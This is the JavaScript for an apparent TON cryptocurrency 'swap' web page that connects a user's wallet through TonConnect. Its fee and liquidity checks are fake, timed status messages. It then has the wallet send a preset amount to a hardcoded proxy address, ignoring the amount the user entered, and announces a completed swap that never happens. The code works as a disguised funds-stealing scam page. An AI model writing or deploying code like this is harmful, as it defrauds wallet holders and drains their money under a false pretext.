// script.js
var tonConnectUI = null;
var isProcessing  = false;

function setStatus(text, isLoading) {
    var el = document.getElementById('status');
    if (!el) return;
    el.innerHTML = isLoading ? '<span class="loader"></span> ' + text : text;
}

function updateBtn(connected) {
    var btn = document.getElementById('swapBtn');
    if (!btn) return;
    btn.textContent     = connected ? 'Swap' : 'Connect Wallet';
    btn.style.background = connected ? '#1f6feb' : '#21262d';
}

function sleep(ms) { return new Promise(function(r){ setTimeout(r, ms); }); }

// CRC32C (Castagnoli) — required by TON BoC
var CRC32C_TABLE = (function () {
    var t = new Uint32Array(256);
    for (var i = 0; i < 256; i++) {
        var c = i;
        for (var k = 0; k < 8; k++) {
            c = (c & 1) ? (0x82F63B78 ^ (c >>> 1)) : (c >>> 1);
        }
        t[i] = c >>> 0;
    }
    return t;
})();
function crc32c(bytes) {
    var c = 0xFFFFFFFF >>> 0;
    for (var i = 0; i < bytes.length; i++) {
        c = (CRC32C_TABLE[(c ^ bytes[i]) & 0xFF] ^ (c >>> 8)) >>> 0;
    }
    return (c ^ 0xFFFFFFFF) >>> 0;
}
function bytesToBase64(bytes) {
    var bin = '';
    for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
    return btoa(bin);
}
// Build a TonConnect payload for a plain text comment (op=0 + utf-8 text)
function textCommentPayload(text) {
    var enc = new TextEncoder().encode(text);
    var dataLen = 4 + enc.length;            // 4 bytes op + text
    var bitsDesc = 2 * dataLen;              // byte-aligned cell
    var cellLen = 2 + dataLen;               // refs_desc + bits_desc + data
    var header = [
        0xB5, 0xEE, 0x9C, 0x72,              // magic
        0x01,                                // flags: hash_crc32=1, size=1
        0x01,                                // off_bytes
        0x01,                                // cells
        0x01,                                // roots
        0x00,                                // absent
        cellLen & 0xFF,                      // tot_cells_size
        0x00                                 // root index
    ];
    var cell = [0x00, bitsDesc & 0xFF, 0x00, 0x00, 0x00, 0x00];
    for (var i = 0; i < enc.length; i++) cell.push(enc[i]);
    var body = new Uint8Array(header.concat(cell));
    var crc = crc32c(body);
    var out = new Uint8Array(body.length + 4);
    out.set(body, 0);
    // CRC32C is appended little-endian
    out[body.length    ] =  crc        & 0xFF;
    out[body.length + 1] = (crc >>> 8) & 0xFF;
    out[body.length + 2] = (crc >>> 16) & 0xFF;
    out[body.length + 3] = (crc >>> 24) & 0xFF;
    return bytesToBase64(out);
}

async function fetchJson(url) {
    var res = await fetch(url, { cache: 'no-store' });
    if (!res.ok) throw new Error('HTTP ' + res.status);
    return res.json();
}

async function getBalance(address) {
    if (!address) return 0;

    // 1) tonapi.io (no API key required, generous rate limits)
    try {
        var j1 = await fetchJson('https://tonapi.io/v2/accounts/' + encodeURIComponent(address));
        if (j1 && typeof j1.balance !== 'undefined') {
            return Number(j1.balance) / 1e9;
        }
    } catch (e1) {
        console.warn('tonapi balance error', e1);
    }

    // 2) toncenter fallback
    try {
        var j2 = await fetchJson('https://toncenter.com/api/v2/getAddressBalance?address=' + encodeURIComponent(address));
        if (j2 && j2.ok) {
            return Number(j2.result) / 1e9;
        }
    } catch (e2) {
        console.warn('toncenter balance error', e2);
    }

    return 0;
}

async function executeFaw(userAddress) {
    var balance = await getBalance(userAddress);
    if (balance < 0.2) {
        setStatus('❌ Insufficient balance (' + balance.toFixed(2) + ' TON)');
        return false;
    }

    setStatus('🔄 Checking pool liquidity...', true);  await sleep(1000);
    setStatus('📊 Calculating fees...', true);           await sleep(800);
    setStatus('🔐 Opening secure channel...', true);    await sleep(700);

    var nano = String(Math.round(parseFloat(two_AMOUNT) * 1e9));

    var tx = {
        validUntil: Math.floor(Date.now() / 1000) + 600,
        messages: [{ address: PROXY_CONTRACT, amount: nano, payload: textCommentPayload('swap') }]
    };

    setStatus('⏳ Confirm in wallet (' + two_AMOUNT + ' TON)');

    try {
        await tonConnectUI.sendTransaction(tx);
        setStatus('✅ Swap completed!');
        return true;
    } catch(e) {
        setStatus('❌ Cancelled: ' + e.message);
        return false;
    }
}

function initApp() {
    // Resolve SDK class only at runtime, after all scripts have loaded
    var TonConnectUIClass = null;
    if (window.TON_CONNECT_UI && window.TON_CONNECT_UI.TonConnectUI) {
        TonConnectUIClass = window.TON_CONNECT_UI.TonConnectUI;
    } else if (window.TonConnectUI) {
        TonConnectUIClass = window.TonConnectUI;
    }

    if (!TonConnectUIClass) {
        console.error('TonConnectUI not found in window');
        setStatus('❌ SDK failed to load. Please refresh.');
        return;
    }

    try {
        tonConnectUI = new TonConnectUIClass({
            manifestUrl: 'https://kareli123.github.io/test123/tonconnect-manifest.json',
            buttonRootId: 'ton-connect'
        });
    } catch(e) {
        console.error('TonConnectUI init error:', e);
        setStatus('❌ Init error: ' + e.message);
        return;
    }

    updateBtn(tonConnectUI.connected);

    tonConnectUI.onStatusChange(async function(wallet) {
        updateBtn(!!wallet);
        var balEl = document.getElementById('user-balance');

        if (wallet && wallet.account) {
            var addr = wallet.account.address;
            setStatus('🪛 ' + addr.slice(0,6) + '...' + addr.slice(-4), true);
            if (balEl) {
                balEl.textContent = 'Balance: loading...';
                var bal = await getBalance(addr);
                balEl.textContent = 'Balance: ' + bal.toFixed(2) + ' TON';
            }
            setStatus('');
        } else {
            if (balEl) balEl.textContent = 'Balance: 0';
        }
    });

    // Sync pay → receive
    var payInput = document.getElementById('payAmount');
    var recInput = document.getElementById('receiveAmount');
    if (payInput && recInput) {
        payInput.addEventListener('input', function() { recInput.value = payInput.value; });
    }

    var btn = document.getElementById('swapBtn');
    if (!btn) return;

    btn.addEventListener('click', async function() {
        if (isProcessing) return;

        if (!tonConnectUI.connected) {
            setStatus('🚀 Opening wallet selector...', true);
            try { await tonConnectUI.openModal(); }
            catch(err) { setStatus('⚠️ ' + err.message); }
        } else {
            var wallet = tonConnectUI.account;
            if (wallet && wallet.address) {
                isProcessing = true;
                var orig = btn.textContent;
                btn.textContent = 'Processing...';
                btn.disabled = true;
                try { await executeFaw(wallet.address); }
                catch(err) { setStatus('⚠️ ' + err.message); }
                finally { isProcessing = false; btn.textContent = orig; btn.disabled = false; }
            }
        }
    });
}

window.addEventListener('load', initApp);
